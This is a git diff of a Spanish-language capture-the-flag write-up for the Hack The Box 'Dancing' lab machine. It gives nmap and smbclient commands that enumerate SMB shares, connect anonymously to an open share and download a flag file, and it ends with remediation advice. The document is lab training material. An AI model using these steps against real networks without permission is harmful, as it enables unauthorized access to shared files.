@@ -1,21 +1,101 @@
-# Dancing
+# 🖥️ Dancing
 
-- Tiramos -> nmap -sCV -Pn 10.129.156.189
-- 135/tcp  open  msrpc         Microsoft Windows RPC
-139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
-445/tcp  open  microsoft-ds?
-5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP
+**Plataforma:** HTB
+**Dificultad:** Easy
 
-- SMB 445
-- smbclient -L ip  para listar
-- Enter y no tienen password configurada ->nmap nos decia Message signing enabled but not required
-- Dentro del scaneo con smbclient ->
-Sharename       Type      Comment
----------       ----      -------
-ADMIN$          Disk      Remote Admin
-C$              Disk      Default shar
-IPC$            IPC       Remote IPC
-WorkShares      Disk     (NO TIENE CONTRASEÑA) 
+---
 
-- Probamos una a una y workshares -> no tiene pw -> entramos al servicio smb con smbclient //Ip/workspaces -n ( no tiene user )
-- navegamos con cd por dos users y vemos que james tine la flag. get flag.txt y listo :)
+## 1. 🔎 Reconocimiento
+
+Se realiza un escaneo con Nmap:
+
+```bash
+nmap -sCV -Pn [IP]
+```
+
+---
+
+## 2. 🔍 Enumeración
+
+### Puertos
+
+| Puerto | Servicio | Versión                   |
+| ------ | -------- | ------------------------- |
+| 135    | MSRPC    | Microsoft Windows RPC     |
+| 139    | NetBIOS  | Microsoft Windows NetBIOS |
+| 445    | SMB      | Microsoft-DS              |
+| 5985   | HTTP     | Microsoft HTTPAPI 2.0     |
+
+### SMB — 445
+
+Se utiliza `smbclient` para listar los recursos compartidos:
+
+```bash
+smbclient -L [IP]
+```
+
+**Recursos encontrados:**
+
+```text
+ADMIN$
+C$
+IPC$
+WorkShares
+```
+
+* `WorkShares` permite acceso sin contraseña.
+* Nmap indica que **SMB Message Signing** está habilitado pero no es obligatorio.
+
+---
+
+## 3. 💥 Explotación
+
+**Vulnerabilidad:** SMB Share accesible sin autenticación.
+
+Nos conectamos al recurso:
+
+```bash
+smbclient //[IP]/WorkShares -N
+```
+
+Una vez dentro, navegamos por los directorios:
+
+```bash
+cd [directorio]
+ls
+```
+
+Encontramos la flag en el directorio de `James`:
+
+```bash
+get flag.txt
+```
+
+**Acceso obtenido:** Acceso al recurso SMB `WorkShares`.
+
+---
+
+## 4. 🐚 Escalada de privilegios
+
+No es necesaria. La flag es accesible directamente mediante el recurso compartido.
+
+---
+
+## 5. 📄 Reporte
+
+### Vulnerabilidades
+
+* **SMB Share sin autenticación** → Permite acceder a archivos compartidos sin credenciales.
+
+### Remediación
+
+* Requerir autenticación para los recursos SMB.
+* Aplicar permisos adecuados a los recursos compartidos.
+
+---
+
+## 🧠 Lessons Learned
+
+* **Aprendí:** SMB, recursos compartidos y `smbclient`.
+* **Herramientas:** Nmap, smbclient.
+* **Comandos nuevos:** `smbclient -L`, `smbclient -N`, `get`.
